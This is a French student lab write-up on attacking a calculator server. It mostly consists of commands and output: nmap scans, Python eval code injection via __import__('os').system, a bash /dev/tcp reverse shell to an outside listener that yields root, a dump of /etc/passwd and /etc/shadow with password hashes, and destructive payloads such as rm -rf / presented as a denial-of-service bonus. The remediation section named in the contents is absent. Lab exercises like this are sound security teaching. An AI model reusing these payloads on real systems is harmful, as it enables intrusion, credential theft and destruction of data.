TP5 SECU : Exploit, pwn, fix
Sommaire :

1. Reconnaissance
2. Exploit
3. Reverse shell
4. Bonus : DOS        
II. Remédiation

1. Reconnaissance

🌞 Déterminer
```
- À quelle IP ce client essaie de se co ? 193.250.183.197 (VM) / 10.33.66.78 (école)

- À quel port il essaie de se co sur cette IP ? 43234 (VM) / 13337 (école)

```
```
batman@BATPC:~$ sudo nmap -sS -p 43234 193.250.183.197 --max-retries 2 --min-rate 10
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-24 20:51 CEST
Nmap scan report for lfbn-bor-1-1375-197.w193-250.abo.wanadoo.fr (193.250.183.197)
Host is up (0.034s latency).

PORT      STATE SERVICE
43234/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds

```
```
batman@BATPC:~$ sudo nmap 10.33.66.0/24 -p 13337 --open
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-25 10:23 CEST
Nmap scan report for 10.33.66.78
Host is up (0.079s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)

Nmap done: 256 IP addresses (29 hosts up) scanned in 24.35 seconds
batman@BATPC:~$ ping 10.33.66.78
PING 10.33.66.78 (10.33.66.78) 56(84) bytes of data.
64 bytes from 10.33.66.78: icmp_seq=1 ttl=64 time=22.0 ms
64 bytes from 10.33.66.78: icmp_seq=2 ttl=64 time=45.6 ms
64 bytes from 10.33.66.78: icmp_seq=3 ttl=64 time=67.8 ms
^C
--- 10.33.66.78 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 22.046/45.140/67.798/18.680 ms

```
 - + ip&port.pcapng dans /Captures


🌞 Scanner le réseau
```
batman@BATPC:~$ sudo nmap -sV 193.250.183.197 -p 43234
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-24 21:03 CEST
Nmap scan report for lfbn-bor-1-1375-197.w193-250.abo.wanadoo.fr (193.250.183.197)
Host is up (0.0057s latency).

PORT      STATE SERVICE VERSION
43234/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port43234-TCP:V=7.93%I=7%D=10/24%Time=671A9A07%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,5,"Hello")%r(RPCCheck,5,"Hello")%r(Kerberos,5,"Hello")%r(S
SF:IPOptions,5,"Hello")%r(NCP,5,"Hello")%r(afp,5,"Hello");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.79 seconds

```
- +tp5_nmap.pcapng /Captures

🌞 Connectez-vous au serveur
```
batman@BATPC:~/reseauxb2$ cat /home/batman/reseauxb2/TP5/client.py | grep 'host ='
host = '193.250.183.197'  # IP du serveur
batman@BATPC:~/reseauxb2$ sudo python3 /home/batman/reseauxb2/TP5/client.py
Veuillez saisir une opération arithmétique : 1+1
'2'
batman@BATPC:~$ cat /var/log/bs_client/bs_client.log 
2024-10-24 21:17:53 INFO Connexion réussie à 193.250.183.197:43234
2024-10-24 21:17:53 INFO Réponse reçue du serveur 193.250.183.197 : b'Hello'
2024-10-24 21:17:59 INFO Message envoyé au serveur 193.250.183.197 : 1+1
2024-10-24 21:17:59 INFO Réponse reçue du serveur 193.250.183.197 : b'2'

```
2. Exploit

🌞 Injecter du code serveur
```
batman@BATPC:~/reseauxb2$ sudo python3 /home/batman/reseauxb2/TP5/client.py
Veuillez saisir une opération arithmétique : __import__('os').system('ping 193.250.183.197')

```

3. Reverse shell

🌞 Obtenez un reverse shell sur le serveur
```
batman@BATPC:~$ nc -lnvp 13337
listening on [any] 13337 ...
connect to [10.33.78.5] from (UNKNOWN) [10.33.66.78] 36974
bash: cannot set terminal process group (1442): Inappropriate ioctl for device
bash: no job control in this shell
[root@localhost /]# 

```
```
batman@BATPC:~$ nc 10.33.66.78 13338

Hello__import__('os').popen('bash -i >& /dev/tcp/10.33.78.5/13337 0>&1').read()
```

🌞 Pwn
- voler les fichiers /etc/shadow et /etc/passwd
```
[root@localhost /]# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
sssd:x:998:996:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
```
```
[root@localhost /]# cat /etc/shadow
cat /etc/shadow
root:$6$.8fzl//9C0M819BS$Sw1mrG49Md8cyNUn0Ai0vlthhzuSZpJ/XVfersVmgXDSBrTVchneIWHYHnT3mC/NutmPS03TneWAHihO0NXrj1::0:99999:7:::
bin:*:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
adm:*:19820:0:99999:7:::
lp:*:19820:0:99999:7:::
sync:*:19820:0:99999:7:::
shutdown:*:19820:0:99999:7:::
halt:*:19820:0:99999:7:::
mail:*:19820:0:99999:7:::
operator:*:19820:0:99999:7:::
games:*:19820:0:99999:7:::
ftp:*:19820:0:99999:7:::
nobody:*:19820:0:99999:7:::
systemd-coredump:!!:20010::::::
dbus:!!:20010::::::
tss:!!:20010::::::
sssd:!!:20010::::::
sshd:!!:20010::::::
chrony:!!:20010::::::
it4:$6$HTSBHGoZflJxXu9u$i54higNbS5p2zVOLWP6P33D39SyWRrEAOjzh97xRa15KzJU3jZfBi/XIPY3FKDoYoSvo1FrirBwNcgmEVpaPK/::0:99999:7:::
tcpdump:!!:20010::::::
```
```
[root@localhost /]# whoami
whoami
root
```
```
[root@localhost /]# ps -ef
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 09:49 ?        00:00:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 31
root           2       0  0 09:49 ?        00:00:00 [kthreadd]
root           3       2  0 09:49 ?        00:00:00 [rcu_gp]
root           4       2  0 09:49 ?        00:00:00 [rcu_par_gp]
root           5       2  0 09:49 ?        00:00:00 [slub_flushwq]
root           6       2  0 09:49 ?        00:00:00 [netns]
root           8       2  0 09:49 ?        00:00:00 [kworker/0:0H-events_highpri]
root          10       2  0 09:49 ?        00:00:00 [mm_percpu_wq]
root          11       2  0 09:49 ?        00:00:00 [kworker/u2:1-events_unbound]
root          12       2  0 09:49 ?        00:00:00 [rcu_tasks_kthre]
root          13       2  0 09:49 ?        00:00:00 [rcu_tasks_rude_]
root          14       2  0 09:49 ?        00:00:00 [rcu_tasks_trace]
root          15       2  0 09:49 ?        00:00:00 [ksoftirqd/0]
root          16       2  0 09:49 ?        00:00:00 [pr/tty0]
root          17       2  0 09:49 ?        00:00:00 [rcu_preempt]
root          18       2  0 09:49 ?        00:00:00 [migration/0]
root          19       2  0 09:49 ?        00:00:00 [idle_inject/0]
root          21       2  0 09:49 ?        00:00:00 [cpuhp/0]
root          23       2  0 09:49 ?        00:00:00 [kdevtmpfs]
root          24       2  0 09:49 ?        00:00:00 [inet_frag_wq]
root          25       2  0 09:49 ?        00:00:00 [kauditd]
root          26       2  0 09:49 ?        00:00:00 [khungtaskd]
root          27       2  0 09:49 ?        00:00:00 [oom_reaper]
root          29       2  0 09:49 ?        00:00:00 [writeback]
root          30       2  0 09:49 ?        00:00:00 [kcompactd0]
root          31       2  0 09:49 ?        00:00:00 [ksmd]
root          32       2  0 09:49 ?        00:00:00 [khugepaged]
root          33       2  0 09:49 ?        00:00:00 [cryptd]
root          34       2  0 09:49 ?        00:00:00 [kintegrityd]
root          35       2  0 09:49 ?        00:00:00 [kblockd]
root          36       2  0 09:49 ?        00:00:00 [blkcg_punt_bio]
root          37       2  0 09:49 ?        00:00:00 [tpm_dev_wq]
root          38       2  0 09:49 ?        00:00:00 [md]
root          39       2  0 09:49 ?        00:00:00 [md_bitmap]
root          40       2  0 09:49 ?        00:00:00 [edac-poller]
root          41       2  0 09:49 ?        00:00:00 [watchdogd]
root          42       2  0 09:49 ?        00:00:00 [kworker/0:1H-kblockd]
root          43       2  0 09:49 ?        00:00:00 [kswapd0]
root          48       2  0 09:49 ?        00:00:00 [kthrotld]
root          53       2  0 09:49 ?        00:00:00 [acpi_thermal_pm]
root          54       2  0 09:49 ?        00:00:00 [kmpath_rdacd]
root          55       2  0 09:49 ?        00:00:00 [kaluad]
root          56       2  0 09:49 ?        00:00:00 [mld]
root          57       2  0 09:49 ?        00:00:00 [ipv6_addrconf]
root          59       2  0 09:49 ?        00:00:00 [kworker/u2:3-events_unbound]
root          67       2  0 09:49 ?        00:00:00 [kstrp]
root          72       2  0 09:49 ?        00:00:00 [zswap-shrink]
root          73       2  0 09:49 ?        00:00:00 [kworker/u3:0]
root         233       2  0 09:49 ?        00:00:12 [kworker/0:3-xfs-buf/dm-0]
root         383       2  0 09:49 ?        00:00:00 [ata_sff]
root         384       2  0 09:49 ?        00:00:00 [scsi_eh_0]
root         386       2  0 09:49 ?        00:00:00 [scsi_tmf_0]
root         387       2  0 09:49 ?        00:00:00 [scsi_eh_1]
root         389       2  0 09:49 ?        00:00:00 [scsi_tmf_1]
root         390       2  0 09:49 ?        00:00:00 [scsi_eh_2]
root         391       2  0 09:49 ?        00:00:00 [scsi_tmf_2]
root         454       2  0 09:49 ?        00:00:00 [kdmflush/253:0]
root         461       2  0 09:49 ?        00:00:00 [kdmflush/253:1]
root         480       2  0 09:49 ?        00:00:00 [xfsalloc]
root         481       2  0 09:49 ?        00:00:00 [xfs_mru_cache]
root         482       2  0 09:49 ?        00:00:00 [xfs-buf/dm-0]
root         483       2  0 09:49 ?        00:00:00 [xfs-conv/dm-0]
root         484       2  0 09:49 ?        00:00:00 [xfs-reclaim/dm-]
root         485       2  0 09:49 ?        00:00:00 [xfs-blockgc/dm-]
root         486       2  0 09:49 ?        00:00:00 [xfs-inodegc/dm-]
root         487       2  0 09:49 ?        00:00:00 [xfs-log/dm-0]
root         488       2  0 09:49 ?        00:00:00 [xfs-cil/dm-0]
root         489       2  0 09:49 ?        00:00:00 [xfsaild/dm-0]
root         552       1  0 09:49 ?        00:00:00 /usr/lib/systemd/systemd-journald
root         566       1  0 09:49 ?        00:00:01 /usr/lib/systemd/systemd-udevd
root         600       2  0 09:49 ?        00:00:00 [xfs-buf/sda1]
root         601       2  0 09:49 ?        00:00:00 [xfs-conv/sda1]
root         602       2  0 09:49 ?        00:00:00 [xfs-reclaim/sda]
root         603       2  0 09:49 ?        00:00:00 [xfs-blockgc/sda]
root         604       2  0 09:49 ?        00:00:00 [xfs-inodegc/sda]
root         605       2  0 09:49 ?        00:00:00 [xfs-log/sda1]
root         606       2  0 09:49 ?        00:00:00 [xfs-cil/sda1]
root         607       2  0 09:49 ?        00:00:00 [xfsaild/sda1]
root         615       2  0 09:49 ?        00:00:00 [irq/18-vmwgfx]
root         616       2  0 09:49 ?        00:00:00 [ttm]
root         624       1  0 09:49 ?        00:00:00 /sbin/auditd
dbus         651       1  0 09:49 ?        00:00:00 /usr/bin/dbus-broker-launch --scope system --audit
dbus         653     651  0 09:49 ?        00:00:00 dbus-broker --log 4 --controller 9 --machine-id cfb8c4e0a10f483199f2aa7fafcfb3b6 --max-bytes 536870912 --max-fds 4096 --max-matches 131072 --audit
root         656       1  0 09:49 ?        00:00:00 /usr/bin/python3 -s /usr/sbin/firewalld --nofork --nopid
root         657       1  0 09:49 ?        00:00:00 /usr/lib/systemd/systemd-logind
chrony       660       1  0 09:49 ?        00:00:00 /usr/sbin/chronyd -F 2
root         665       1  0 09:49 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
root         692       1  0 09:49 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         703       1  0 09:49 ?        00:00:00 /usr/sbin/crond -n
root         712       1  0 09:49 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
root         771       1  0 09:49 ?        00:00:00 /usr/sbin/rsyslogd -n
root        1273       2  0 10:02 ?        00:00:00 [kworker/u2:2-events_unbound]
root        1307       2  0 10:10 ?        00:00:00 [tls-strp]
root        1442       1  0 10:36 ?        00:00:00 /usr/bin/python3 /opt/calc/server.py
root        1527       2  0 10:59 ?        00:00:00 [kworker/0:0-cgroup_destroy]
root        1633    1442  0 11:15 ?        00:00:00 /bin/sh -c bash -i >& /dev/tcp/10.33.78.5/13337 0>&1
root        1634    1633  0 11:15 ?        00:00:00 bash -i
root        1662       2  0 11:17 ?        00:00:00 [kworker/0:1-kdmflush/253:0]
root        1676    1634  0 11:19 ?        00:00:00 ps -ef
```
```
[root@localhost /]# ss -tulnp
ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                           
udp   UNCONN 0      0          127.0.0.1:323        0.0.0.0:*    users:(("chronyd",pid=660,fd=5)) 
udp   UNCONN 0      0              [::1]:323           [::]:*    users:(("chronyd",pid=660,fd=6)) 
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=692,fd=3))    
tcp   LISTEN 0      1            0.0.0.0:13337      0.0.0.0:*    users:(("python3",pid=1442,fd=3))
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=692,fd=4))  
```
4. Bonus : DOS

⭐ BONUS : DOS l'application
- des boucles à l'inifini
```
 python3 /home/batman/Reseau/TP5/client.py 
Veuillez saisir une opération arithmétique : __import__('os').system('ping 10.33.66.78')
```
- tout supprimer 
```
python3 /home/batman/Reseau/TP5/client.py 
Veuillez saisir une opération arithmétique : __import__('os').system('rm -rf /')
```
- l'éteindre 
```
python3 /home/batman/Reseau/TP5/client.py 
Veuillez saisir une opération arithmétique : __import__('os').system('shutdwon now')
```